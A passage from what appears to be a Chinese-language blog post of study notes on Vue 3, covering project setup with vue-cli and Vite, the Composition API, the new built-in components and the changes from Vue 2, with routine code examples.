</ul>
<h2 id="1-4-新的特性"><a href="#1-4-新的特性" class="headerlink" title="1.4 新的特性"></a>1.4 新的特性</h2><ol>
<li>Composition API（组合API）<ul>
<li><code>setup</code>配置</li>
<li><code>ref</code>与<code>reactive</code></li>
<li><code>watch</code>与<code>watchEffect</code></li>
<li><code>provide</code>与 <code>inject</code></li>
</ul>
</li>
<li>新的内置组件<ul>
<li><code>Fragment </code></li>
<li><code>Teleport</code></li>
<li><code>Suspense</code></li>
</ul>
</li>
<li>其他改变<ul>
<li>新的生命周期钩子</li>
<li><code>data </code>选项应始终被声明为一个函数</li>
<li>移除<code>keyCode</code>支持作为 <code>v-on</code> 的修饰符</li>
</ul>
</li>
</ol>
<h1 id="2-创建一个Vue项目"><a href="#2-创建一个Vue项目" class="headerlink" title="2. 创建一个Vue项目"></a>2. 创建一个Vue项目</h1><h2 id="2-1-使用-vue-cli-创建"><a href="#2-1-使用-vue-cli-创建" class="headerlink" title="2.1 使用 vue-cli 创建"></a>2.1 使用 vue-cli 创建</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create">https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create</a></p>
<pre><code class="bash">## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 安装或者升级你的@vue/cli
npm install -g @vue/cli
## 创建Vue项目，选择Vue3
vue create vue3_test
## 启动
cd vue_test
npm run serve
</code></pre>
<h2 id="2-2-使用-vite-创建-了解"><a href="#2-2-使用-vite-创建-了解" class="headerlink" title="2.2 使用 vite 创建 (了解)"></a>2.2 使用 vite 创建 (了解)</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://v3.cn.vuejs.org/guide/installation.html#vite">https://v3.cn.vuejs.org/guide/installation.html#vite</a></p>
<p>vite官网：<a target="_blank" rel="noopener" href="https://vitejs.cn/">https://vitejs.cn</a></p>
<ul>
<li>什么是vite？—— 是Vue团队打造的新一代前端构建工具。</li>
<li>优势如下：<ul>
<li>开发环境中，无需打包操作，可快速的冷启动。</li>
<li>轻量快速的热重载（HMR）。</li>
<li>真正的按需编译，不再等待整个应用编译完成。</li>
</ul>
</li>
<li>传统构建 与 vite构建对比图</li>
</ul>
<blockquote>
<p>传统构建模式，是将所有资源都打包好，再上线</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/af5f8d4493f3423087d6b9e6c5e60fa1tplv-k3u1fbpfcp-zoom-in-crop-mark3024000.webp" alt="在这里插入图片描述"></p>
<blockquote>
<p>Vite是按需加载</p>
</blockquote>
<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/c57d4d695fe64014b78610ff2a5cd2b6tplv-k3u1fbpfcp-zoom-in-crop-mark3024000.webp" alt="在这里插入图片描述"></p>
<p>接下来我们就用Vite来创建一个Vue3的项目</p>
<pre><code class="powershell">## 创建工程
npm init vite-app vue3_test-vite  ##vue3_test-vite 工程目錄名
## 进入工程目录
cd vue3_test-vite
## 安装依赖
npm install
## 运行
npm run dev
</code></pre>
<h2 id="2-3-分析工程結構"><a href="#2-3-分析工程結構" class="headerlink" title="2.3 分析工程結構"></a>2.3 分析工程結構</h2><h3 id="2-3-1-main-js"><a href="#2-3-1-main-js" class="headerlink" title="2.3.1 main.js"></a>2.3.1 main.js</h3><p>Vue2项目的main.js</p>
<pre><code class="javascript">import Vue from &#39;vue&#39;
import App from &#39;./App.vue&#39;

Vue.config.productionTip = false

new Vue(&#123;
  render: h =&gt; h(App),
&#125;).$mount(&#39;#app&#39;)
</code></pre>
<p>我们再来看看Vue3项目中的main.js</p>
<pre><code class="js">import &#123; createApp &#125; from &#39;vue&#39;
import App from &#39;./App.vue&#39;

createApp(App).mount(&#39;#app&#39;)
</code></pre>
<p>分析一下</p>
<pre><code class="js">// 引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数  (構造函數 =&gt; 使用new創建；工廠函數 =&gt; 不須使用new創建，直接用)
import &#123; createApp &#125; from &#39;vue&#39;
import App from &#39;./App.vue&#39;

// 创建应用实例对象——app(类似于之前Vue2中的vm，但app比vm更“轻”)
const app = createApp(App) //將createApp(App).mount(&#39;#app&#39;) 拆解為const app = createApp(App) ，app.mount(&#39;#app&#39;)
console.log(app)
// 挂载
app.mount(&#39;#app&#39;)
</code></pre>
<h3 id="2-3-2-App-vue"><a href="#2-3-2-App-vue" class="headerlink" title="2.3.2 App.vue"></a>2.3.2 App.vue</h3><p>我们再来看看组件</p>
<p>在<code>template</code>标签里可以没有根标签了</p>
<pre><code class="html">&lt;template&gt;
    &lt;!-- Vue3组件中的模板结构可以没有根标签 --&gt;
    &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;
    &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;
&lt;/template&gt;
</code></pre>
<h1 id="3-常用-Composition-API"><a href="#3-常用-Composition-API" class="headerlink" title="3. 常用 Composition API"></a>3. 常用 Composition API</h1><p>官方文档: <a target="_blank" rel="noopener" href="https://v3.cn.vuejs.org/guide/composition-api-introduction.html">https://v3.cn.vuejs.org/guide/composition-api-introduction.html</a></p>
<h2 id="3-1-拉开序幕的setup"><a href="#3-1-拉开序幕的setup" class="headerlink" title="3.1 拉开序幕的setup"></a>3.1 拉开序幕的setup</h2><ol>
<li>理解：Vue3.0中一个新的配置项，值为一个函数。</li>
<li>setup是所有<strong style="color:#DD5145">Composition API（组合API）</strong><i style="color:gray;font-weight:bold">“ 表演的舞台 ”</i>。</li>
<li>组件中所用到的：数据、方法等等，均要配置在setup中。</li>
<li>setup函数的两种返回值：<ol>
<li>若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）</li>
<li><span style="color:#aad">若返回一个渲染函数：则可以自定义渲染内容。（了解）</span></li>
</ol>
</li>
<li>注意点：<ol>
<li>尽量不要与Vue2.x配置混用<ul>
<li>Vue2.x配置（data、methos、computed…）中<strong style="color:#DD5145">可以访问到</strong>setup中的属性、方法。</li>
<li>但在setup中<strong style="color:#DD5145">不能访问到</strong>Vue2.x配置（data、methos、computed…）。</li>
<li>如果有重名, setup优先。</li>
</ul>
</li>
<li>setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）</li>
</ol>
</li>
</ol>
<h2 id="3-2-ref函数"><a href="#3-2-ref函数" class="headerlink" title="3.2 ref函数"></a>3.2 ref函数</h2><ul>
<li>作用: 定义一个响应式的数据</li>
<li>语法: <code>const xxx = ref(initValue)</code><ul>
<li>创建一个包含响应式数据的<strong style="color:#DD5145">引用对象（reference对象，简称ref对象）</strong>。</li>
<li>JS中操作数据： <code>xxx.value</code></li>
<li>模板中读取数据: 不需要.value，直接：<code>&lt;div&gt;&#123;&#123;xxx&#125;&#125;&lt;/div&gt;</code></li>
</ul>
</li>
<li>备注：<ul>
<li>接收的数据可以是：基本类型、也可以是对象类型。</li>
<li>基本类型的数据：响应式依然是靠<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>完成的。</li>
<li>对象类型的数据：内部 <i style="color:gray;font-weight:bold">“ 求助 ”</i> 了Vue3.0中的一个新函数—— <code>reactive</code>函数。</li>
</ul>
</li>
</ul>
<h2 id="3-3-reactive函数"><a href="#3-3-reactive函数" class="headerlink" title="3.3 reactive函数"></a>3.3 reactive函数</h2><ul>
<li>作用: 定义一个<strong style="color:#DD5145">对象类型</strong>的响应式数据（基本类型不要用它，要用<code>ref</code>函数）</li>
<li>语法：<code>const 代理对象= reactive(源对象)</code>接收一个对象（或数组），返回一个<strong style="color:#DD5145">代理对象（Proxy的实例对象，简称proxy对象）</strong></li>
<li>reactive定义的响应式数据是“深层次的”。</li>
<li>内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作。</li>
</ul>
<h2 id="3-4-Vue3-0中的响应式原理"><a href="#3-4-Vue3-0中的响应式原理" class="headerlink" title="3.4 Vue3.0中的响应式原理"></a>3.4 Vue3.0中的响应式原理</h2><h3 id="3-4-1-vue2-x的响应式"><a href="#3-4-1-vue2-x的响应式" class="headerlink" title="3.4.1 vue2.x的响应式"></a>3.4.1 vue2.x的响应式</h3><ul>
<li><p>实现原理：</p>
<ul>
<li><p>对象类型：通过<code>Object.defineProperty()</code>对属性的读取、修改进行拦截（数据劫持）。</p>
</li>
<li><p>数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）。</p>
<pre><code class="js">Object.defineProperty(data, &#39;count&#39;, &#123;
    get () &#123;&#125;, 
    set () &#123;&#125;
&#125;)
</code></pre>
</li>
</ul>
</li>
<li><p>存在问题：</p>
<ul>
<li>新增属性、删除属性, 界面不会更新。</li>
<li>直接通过下标修改数组, 界面不会自动更新。</li>
</ul>
</li>
</ul>
<h3 id="3-4-2-Vue3-0的响应式"><a href="#3-4-2-Vue3-0的响应式" class="headerlink" title="3.4.2 Vue3.0的响应式"></a>3.4.2 Vue3.0的响应式</h3><ul>
<li><p>实现原理:</p>
<ul>
<li><p>通过Proxy（代理）:  拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。</p>
</li>
<li><p>通过Reflect（反射）:  对源对象的属性进行操作。</p>
</li>
<li><p>MDN文档中描述的Proxy与Reflect：</p>
<ul>
<li><p>Proxy：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy</a></p>
</li>
<li><p>Reflect：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect</a></p>
<pre><code class="js">new Proxy(data, &#123;
    // 拦截读取属性值
    get (target, prop) &#123;
        return Reflect.get(target, prop)
    &#125;,
    // 拦截设置属性值或添加新属性
    set (target, prop, value) &#123;
        return Reflect.set(target, prop, value)
    &#125;,
    // 拦截删除属性
    deleteProperty (target, prop) &#123;
        return Reflect.deleteProperty(target, prop)
    &#125;
&#125;)

proxy.name = &#39;tom&#39;   
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-5-reactive对比ref"><a href="#3-5-reactive对比ref" class="headerlink" title="3.5 reactive对比ref"></a>3.5 reactive对比ref</h2><ul>
<li>从定义数据角度对比：<ul>
<li> ref用来定义：<strong style="color:#DD5145">基本类型数据</strong>。</li>
<li> reactive用来定义：<strong style="color:#DD5145">对象（或数组）类型数据</strong>。</li>
<li> 备注：ref也可以用来定义<strong style="color:#DD5145">对象（或数组）类型数据</strong>, 它内部会自动通过<code>reactive</code>转为<strong style="color:#DD5145">代理对象</strong>。</li>
</ul>
</li>
<li>从原理角度对比：<ul>
<li> ref通过<code>Object.defineProperty()</code>的<code>get</code>与<code>set</code>来实现响应式（数据劫持）。</li>
<li> reactive通过使用<strong style="color:#DD5145">Proxy</strong>来实现响应式（数据劫持）, 并通过<strong style="color:#DD5145">Reflect</strong>操作<strong style="color:orange">源对象</strong>内部的数据。</li>
</ul>
</li>
<li>从使用角度对比：<ul>
<li> ref定义的数据：操作数据<strong style="color:#DD5145">需要</strong><code>.value</code>，读取数据时模板中直接读取<strong style="color:#DD5145">不需要</strong><code>.value</code>。</li>
<li> reactive定义的数据：操作数据与读取数据：<strong style="color:#DD5145">均不需要</strong><code>.value</code>。</li>
</ul>
</li>
</ul>
<h2 id="3-6-setup的两个注意点"><a href="#3-6-setup的两个注意点" class="headerlink" title="3.6 setup的两个注意点"></a>3.6 setup的两个注意点</h2><ul>
<li><p>setup执行的时机</p>
<ul>
<li>在beforeCreate之前执行一次，this是undefined。</li>
</ul>
</li>
<li><p>setup的参数</p>
<ul>
<li>props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。</li>
<li>context：上下文对象<ul>
<li>attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 <code>this.$attrs</code>。</li>
<li>slots: 收到的插槽内容, 相当于 <code>this.$slots</code>。</li>
<li>emit: 分发自定义事件的函数, 相当于 <code>this.$emit</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-7-计算属性与监视"><a href="#3-7-计算属性与监视" class="headerlink" title="3.7 计算属性与监视"></a>3.7 计算属性与监视</h2><h3 id="3-7-1-computed函数"><a href="#3-7-1-computed函数" class="headerlink" title="3.7.1 computed函数"></a>3.7.1 computed函数</h3><ul>
<li><p>与Vue2.x中computed配置功能一致</p>
</li>
<li><p>写法</p>
<pre><code class="js">import &#123;computed&#125; from &#39;vue&#39;

setup()&#123;
    ...
    //计算属性——简写
    let fullName = computed(()=&gt;&#123;
        return person.firstName + &#39;-&#39; + person.lastName
    &#125;)
    //计算属性——完整
    let fullName = computed(&#123;
        get()&#123;
            return person.firstName + &#39;-&#39; + person.lastName
        &#125;,
        set(value)&#123;
            const nameArr = value.split(&#39;-&#39;)
            person.firstName = nameArr[0]
            person.lastName = nameArr[1]
        &#125;
    &#125;)
&#125;
</code></pre>
</li>
</ul>
<h3 id="3-7-2-watch函数"><a href="#3-7-2-watch函数" class="headerlink" title="3.7.2 watch函数"></a>3.7.2 watch函数</h3><ul>
<li><p>与Vue2.x中watch配置功能一致</p>
</li>
<li><p>两个小“坑”：</p>
<ul>
<li>监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。</li>
<li>监视reactive定义的响应式数据中某个属性时：deep配置有效。</li>
</ul>
<pre><code class="js">//情况一：监视ref定义的响应式数据
watch(sum,(newValue,oldValue)=&gt;&#123;
    console.log(&#39;sum变化了&#39;,newValue,oldValue)
&#125;,&#123;immediate:true&#125;)

//情况二：监视多个ref定义的响应式数据
watch([sum,msg],(newValue,oldValue)=&gt;&#123;
    console.log(&#39;sum或msg变化了&#39;,newValue,oldValue)
&#125;) 

/* 情况三：监视reactive定义的响应式数据
            若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
            若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
*/
watch(person,(newValue,oldValue)=&gt;&#123;
    console.log(&#39;person变化了&#39;,newValue,oldValue)
&#125;,&#123;immediate:true,deep:false&#125;) //此处的deep配置不再奏效

//情况四：监视reactive定义的响应式数据中的某个属性
watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123;
    console.log(&#39;person的job变化了&#39;,newValue,oldValue)
&#125;,&#123;immediate:true,deep:true&#125;) 

//情况五：监视reactive定义的响应式数据中的某些属性
watch([()=&gt;person.job,()=&gt;person.name],(newValue,oldValue)=&gt;&#123;
    console.log(&#39;person的job变化了&#39;,newValue,oldValue)
&#125;,&#123;immediate:true,deep:true&#125;)

//特殊情况
watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123;
    console.log(&#39;person的job变化了&#39;,newValue,oldValue)
&#125;,&#123;deep:true&#125;) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
</code></pre>
</li>
</ul>
<h3 id="3-7-3-watchEffect函数"><a href="#3-7-3-watchEffect函数" class="headerlink" title="3.7.3 watchEffect函数"></a>3.7.3 watchEffect函数</h3><ul>
<li><p>watch的套路是：既要指明监视的属性，也要指明监视的回调。</p>
</li>
<li><p>watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。</p>
</li>
<li><p>watchEffect有点像computed：</p>
<ul>
<li>但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。</li>
<li>而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。</li>
</ul>
<pre><code class="js">//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
watchEffect(()=&gt;&#123;
    const x1 = sum.value
    const x2 = person.age
    console.log(&#39;watchEffect配置的回调执行了&#39;)
&#125;)
</code></pre>
</li>
</ul>
<h2 id="3-8-生命周期"><a href="#3-8-生命周期" class="headerlink" title="3.8 生命周期"></a>3.8 生命周期</h2><div style="border:1px solid black;width:380px;float:left;margin-right:20px;"><strong>vue2.x的生命周期</strong><img src="image-20230416103501730.png" alt="lifecycle_2" style="zoom:33%;width:1200px" /></div><div style="border:1px solid black;width:380px;height:650px;float:left"><strong>vue3.0的生命周期</strong><img src="115c5318692445e78577f8ef0eb22333.png" alt="lifecycle_2" style="zoom:33%;width:1200px" /></div></br> 






























<ul>
<li>Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名：<ul>
<li><code>beforeDestroy</code>改名为 <code>beforeUnmount</code></li>
<li><code>destroyed</code>改名为 <code>unmounted</code></li>
</ul>
</li>
<li>Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下：<ul>
<li><code>beforeCreate</code>===&gt;<code>setup()</code></li>
<li><code>created</code>=======&gt;<code>setup()</code></li>
<li><code>beforeMount</code> ===&gt;<code>onBeforeMount</code></li>
<li><code>mounted</code>=======&gt;<code>onMounted</code></li>
<li><code>beforeUpdate</code>===&gt;<code>onBeforeUpdate</code></li>
<li><code>updated</code> =======&gt;<code>onUpdated</code></li>
<li><code>beforeUnmount</code> ==&gt;<code>onBeforeUnmount</code></li>
<li><code>unmounted</code> =====&gt;<code>onUnmounted</code></li>
</ul>
</li>
</ul>
<h2 id="3-9-自定义hook函数"><a href="#3-9-自定义hook函数" class="headerlink" title="3.9 自定义hook函数"></a>3.9 自定义hook函数</h2><ul>
<li><p>什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。</p>
</li>
<li><p>类似于vue2.x中的mixin。</p>
</li>
<li><p>自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。</p>
</li>
</ul>
<h2 id="3-10-toRef"><a href="#3-10-toRef" class="headerlink" title="3.10 toRef"></a>3.10 toRef</h2><ul>
<li>作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。</li>
<li>语法：<code>const name = toRef(person,&#39;name&#39;)</code></li>
<li>应用:   要将响应式对象中的某个属性单独提供给外部使用时。</li>
</ul>
<ul>
<li>扩展：<code>toRefs</code> 与<code>toRef</code>功能一致，但可以批量创建多个 ref 对象，语法：<code>toRefs(person)</code></li>
</ul>
<h1 id="三、其它-Composition-API"><a href="#三、其它-Composition-API" class="headerlink" title="三、其它 Composition API"></a>三、其它 Composition API</h1><h2 id="1-shallowReactive-与-shallowRef"><a href="#1-shallowReactive-与-shallowRef" class="headerlink" title="1.shallowReactive 与 shallowRef"></a>1.shallowReactive 与 shallowRef</h2><ul>
<li><p>shallowReactive：只处理对象最外层属性的响应式（浅响应式）。</p>
</li>
<li><p>shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理。</p>
</li>
<li><p>什么时候使用?</p>
<ul>
<li> 如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===&gt; shallowReactive。</li>
<li> 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===&gt; shallowRef。</li>
</ul>
</li>
</ul>
<h2 id="2-readonly-与-shallowReadonly"><a href="#2-readonly-与-shallowReadonly" class="headerlink" title="2.readonly 与 shallowReadonly"></a>2.readonly 与 shallowReadonly</h2><ul>
<li>readonly: 让一个响应式数据变为只读的（深只读）。</li>
<li>shallowReadonly：让一个响应式数据变为只读的（浅只读）。</li>
<li>应用场景: 不希望数据被修改时。</li>
</ul>
<h2 id="3-toRaw-与-markRaw"><a href="#3-toRaw-与-markRaw" class="headerlink" title="3.toRaw 与 markRaw"></a>3.toRaw 与 markRaw</h2><ul>
<li>toRaw：<ul>
<li>作用：将一个由<code>reactive</code>生成的<strong style="color:orange">响应式对象</strong>转为<strong style="color:orange">普通对象</strong>。</li>
<li>使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。</li>
</ul>
</li>
<li>markRaw：<ul>
<li>作用：标记一个对象，使其永远不会再成为响应式对象。</li>
<li>应用场景:<ol>
<li>有些值不应被设置为响应式的，例如复杂的第三方类库等。</li>
<li>当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。</li>
</ol>
</li>
</ul>
</li>
</ul>
<h2 id="4-customRef"><a href="#4-customRef" class="headerlink" title="4.customRef"></a>4.customRef</h2><ul>
<li><p>作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。</p>
</li>
<li><p>实现防抖效果：</p>
<pre><code class="vue">&lt;template&gt;
    &lt;input type=&quot;text&quot; v-model=&quot;keyword&quot;&gt;
    &lt;h3&gt;&#123;&#123;keyword&#125;&#125;&lt;/h3&gt;
&lt;/template&gt;

&lt;script&gt;
    import &#123;ref,customRef&#125; from &#39;vue&#39;
    export default &#123;
        name:&#39;Demo&#39;,
        setup()&#123;
            // let keyword = ref(&#39;hello&#39;) //使用Vue准备好的内置ref
            //自定义一个myRef
            function myRef(value,delay)&#123;
                let timer
                //通过customRef去实现自定义
                return customRef((track,trigger)=&gt;&#123;
                    return&#123;
                        get()&#123;
                            track() //告诉Vue这个value值是需要被“追踪”的
                            return value
                        &#125;,
                        set(newValue)&#123;
                            clearTimeout(timer)
                            timer = setTimeout(()=&gt;&#123;
                                value = newValue
                                trigger() //告诉Vue去更新界面
                            &#125;,delay)
                        &#125;
                    &#125;
                &#125;)
            &#125;
            let keyword = myRef(&#39;hello&#39;,500) //使用程序员自定义的ref
            return &#123;
                keyword
            &#125;
        &#125;
    &#125;
&lt;/script&gt;
</code></pre>
</li>
</ul>
<h2 id="5-provide-与-inject"><a href="#5-provide-与-inject" class="headerlink" title="5.provide 与 inject"></a>5.provide 与 inject</h2> <img src="image-20230416115549018.png" alt="image-20230416115549018" style="zoom:67%;" />

<ul>
<li><p>作用：实现<strong style="color:#DD5145">祖与后代组件间</strong>通信</p>
</li>
<li><p>套路：父组件有一个 <code>provide</code> 选项来提供数据，后代组件有一个 <code>inject</code> 选项来开始使用这些数据</p>
</li>
<li><p>具体写法：</p>
<ol>
<li><p>祖组件中：</p>
<pre><code class="js">setup()&#123;
    ......
    let car = reactive(&#123;name:&#39;奔驰&#39;,price:&#39;40万&#39;&#125;)
    provide(&#39;car&#39;,car)
    ......
&#125;
</code></pre>
</li>
<li><p>后代组件中：</p>
<pre><code class="js">setup(props,context)&#123;
    ......
    const car = inject(&#39;car&#39;)
    return &#123;car&#125;
    ......
&#125;
</code></pre>
</li>
</ol>
</li>
</ul>
<h2 id="6-响应式数据的判断"><a href="#6-响应式数据的判断" class="headerlink" title="6.响应式数据的判断"></a>6.响应式数据的判断</h2><ul>
<li>isRef: 检查一个值是否为一个 ref 对象</li>
<li>isReactive: 检查一个对象是否是由 <code>reactive</code> 创建的响应式代理</li>
<li>isReadonly: 检查一个对象是否是由 <code>readonly</code> 创建的只读代理</li>
<li>isProxy: 检查一个对象是否是由 <code>reactive</code> 或者 <code>readonly</code> 方法创建的代理</li>
</ul>
<h1 id="四、Composition-API-的优势"><a href="#四、Composition-API-的优势" class="headerlink" title="四、Composition API 的优势"></a>四、Composition API 的优势</h1><h2 id="1-Options-API-存在的问题"><a href="#1-Options-API-存在的问题" class="headerlink" title="1.Options API 存在的问题"></a>1.Options API 存在的问题</h2><p>使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。</p>
 <img src="f84e4e2c02424d9a99862ade0a2e4114tplv-k3u1fbpfcp-watermark.gif" alt="img" style="zoom:80%;" />



 <img src="e5ac7e20d1784887a826f6360768a368~tplv-k3u1fbpfcp-watermark.gif" alt="img" style="zoom:80%;" />

<h2 id="2-Composition-API-的优势"><a href="#2-Composition-API-的优势" class="headerlink" title="2.Composition API 的优势"></a>2.Composition API 的优势</h2><p>我们可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。</p>
 <img src="bc0be8211fc54b6c941c036791ba4efetplv-k3u1fbpfcp-watermark.gif" alt="img" style="zoom:67%;" />

 <img src="6cc55165c0e34069a75fe36f8712eb80tplv-k3u1fbpfcp-watermark.gif" alt="img" style="zoom:67%;" />




<h1 id="五、新的组件"><a href="#五、新的组件" class="headerlink" title="五、新的组件"></a>五、新的组件</h1><h2 id="1-Fragment"><a href="#1-Fragment" class="headerlink" title="1.Fragment"></a>1.Fragment</h2><ul>
<li>在Vue2中: 组件必须有一个根标签</li>
<li>在Vue3中: 组件可以没有根标签, 内部会将多个标签包含在一个Fragment虚拟元素中</li>
<li>好处: 减少标签层级, 减小内存占用</li>
</ul>
<h2 id="2-Teleport"><a href="#2-Teleport" class="headerlink" title="2.Teleport"></a>2.Teleport</h2><ul>
<li><p>什么是Teleport？—— <code>Teleport</code> 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。</p>
<pre><code class="vue">&lt;teleport to=&quot;移动位置&quot;&gt;
    &lt;div v-if=&quot;isShow&quot; class=&quot;mask&quot;&gt;
        &lt;div class=&quot;dialog&quot;&gt;
            &lt;h3&gt;我是一个弹窗&lt;/h3&gt;
            &lt;button @click=&quot;isShow = false&quot;&gt;关闭弹窗&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/teleport&gt;
</code></pre>
</li>
</ul>
<h2 id="3-Suspense"><a href="#3-Suspense" class="headerlink" title="3.Suspense"></a>3.Suspense</h2><ul>
<li><p>等待异步组件时渲染一些额外内容，让应用有更好的用户体验</p>
</li>
<li><p>使用步骤：</p>
<ul>
<li><p>异步引入组件</p>
<pre><code class="js">import &#123;defineAsyncComponent&#125; from &#39;vue&#39;
const Child = defineAsyncComponent(()=&gt;import(&#39;./components/Child.vue&#39;))
</code></pre>
</li>
<li><p>使用<code>Suspense</code>包裹组件，并配置好<code>default</code> 与 <code>fallback</code></p>
<pre><code class="vue">&lt;template&gt;
    &lt;div class=&quot;app&quot;&gt;
        &lt;h3&gt;我是App组件&lt;/h3&gt;
        &lt;Suspense&gt;
            &lt;template v-slot:default&gt;
                &lt;Child/&gt;
            &lt;/template&gt;
            &lt;template v-slot:fallback&gt;
                &lt;h3&gt;加载中.....&lt;/h3&gt;
            &lt;/template&gt;
        &lt;/Suspense&gt;
    &lt;/div&gt;
&lt;/template&gt;
</code></pre>
</li>
</ul>
</li>
</ul>
<h1 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h1><h2 id="1-全局API的转移"><a href="#1-全局API的转移" class="headerlink" title="1.全局API的转移"></a>1.全局API的转移</h2><ul>
<li><p>Vue 2.x 有许多全局 API 和配置。</p>
<ul>
<li><p>例如：注册全局组件、注册全局指令等。</p>
<pre><code class="js">//注册全局组件
Vue.component(&#39;MyButton&#39;, &#123;
  data: () =&gt; (&#123;
    count: 0
  &#125;),
  template: &#39;&lt;button @click=&quot;count++&quot;&gt;Clicked &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&#39;
&#125;)

//注册全局指令
Vue.directive(&#39;focus&#39;, &#123;
  inserted: el =&gt; el.focus()
&#125;
</code></pre>
</li>
</ul>
</li>
<li><p>Vue3.0中对这些API做出了调整：</p>
<ul>
<li><p>将全局的API，即：<code>Vue.xxx</code>调整到应用实例（<code>app</code>）上</p>
<p>| 2.x 全局 API（<code>Vue</code>） | 3.x 实例 API (<code>app</code>)                        |</p>
<pre><code>| ------------------------- | ------------------------------------------- |
</code></pre>
<p>| Vue.config.xxxx           | app.config.xxxx                             |<br>| Vue.config.productionTip  | <strong style="color:#DD5145">移除</strong> |<br>| Vue.component             | app.component                               |<br>| Vue.directive             | app.directive                               |<br>| Vue.mixin                 | app.mixin                                   |<br>| Vue.use                   | app.use                                     |<br>| Vue.prototype             | app.config.globalProperties                 |</p>
</li>
</ul>
</li>
</ul>
<h2 id="2-其他改变"><a href="#2-其他改变" class="headerlink" title="2.其他改变"></a>2.其他改变</h2><ul>
<li><p>data选项应始终被声明为一个函数。</p>
</li>
<li><p>过度类名的更改：</p>
<ul>
<li><p>Vue2.x写法</p>
<pre><code class="css">.v-enter,
.v-leave-to &#123;
  opacity: 0;
&#125;
.v-leave,
.v-enter-to &#123;
  opacity: 1;
&#125;
</code></pre>
</li>
<li><p>Vue3.x写法</p>
<pre><code class="css">.v-enter-from,
.v-leave-to &#123;
  opacity: 0;
&#125;

.v-leave-from,
.v-enter-to &#123;
  opacity: 1;
&#125;
</code></pre>
</li>
</ul>
</li>
<li><p><strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持<code>config.keyCodes</code></p>
</li>
<li><p><strong style="color:#DD5145">移除</strong><code>v-on.native</code>修饰符</p>
<ul>
<li><p>父组件中绑定事件</p>
<pre><code class="vue">&lt;my-component
  v-on:close=&quot;handleComponentEvent&quot;
  v-on:click=&quot;handleNativeClickEvent&quot;
/&gt;
</code></pre>
</li>
<li><p>子组件中声明自定义事件</p>
<pre><code class="vue">&lt;script&gt;
  export default &#123;
    emits: [&#39;close&#39;]
  &#125;
&lt;/script&gt;
</code></pre>
</li>
</ul>
</li>
<li><p><strong style="color:#DD5145">移除</strong>过滤器（filter）</p>
<blockquote>
<p>过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。</p>
</blockquote>
</li>
<li><p>……</p>
</li>
</ul>

      
       <hr><span style="font-style: italic;color: gray;"> 轉載請注明來源，歡迎對文章中的引用來源進行考證，歡迎指出任何有錯誤或不夠清晰的表達。可以郵件至 b8954008@gmail.com </span>
    </div>
</article>







    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2023-2030 Eker
</p>
